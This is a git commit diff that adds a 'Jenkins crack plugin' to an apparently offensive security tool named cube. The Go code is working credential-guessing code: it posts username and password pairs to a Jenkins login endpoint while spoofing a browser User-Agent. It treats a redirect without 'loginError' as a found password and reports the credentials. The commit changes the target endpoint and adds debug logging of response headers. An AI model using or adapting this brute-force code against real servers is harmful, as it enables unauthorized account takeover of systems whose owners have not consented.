f9c3b703ec47f1d8d098f2c60ff30ed42858dc21
JKme <2935865+JKme@users.noreply.github.com>
2021-07-16 14:07:21 +0800

    add jenkins crack plugin

--- plugins/crack/jenkins.go
+++ plugins/crack/jenkins.go
@@ -1,6 +1,7 @@
 package crack
 
 import (
+	"cube/log"
 	"cube/model"
 	"fmt"
 	"net/http"
@@ -20,7 +21,7 @@ func JenkinsCrack(task model.CrackTask) (result model.CrackTaskResult) {
 	urlValues.Add("j_username", task.Auth.User)
 	urlValues.Add("j_password", task.Auth.Password)
 	body := strings.NewReader(urlValues.Encode())
-	req, _ := http.NewRequest("POST", task.Ip+"/j_spring_security_check", body)
+	req, _ := http.NewRequest("POST", task.Ip+"/j_acegi_security_check", body)
 	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
 	req.Header.Add("Connection", "close")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
@@ -30,7 +31,7 @@ func JenkinsCrack(task model.CrackTask) (result model.CrackTaskResult) {
 		panic(err)
 	}
 	defer res.Body.Close()
-
+	log.Debug(res.Header)
 	if !strings.Contains(res.Header.Get("Location"), "loginError") {
 		result.Result = fmt.Sprintf("User: %s \t Password: %s", task.Auth.User, task.Auth.Password)
 	}
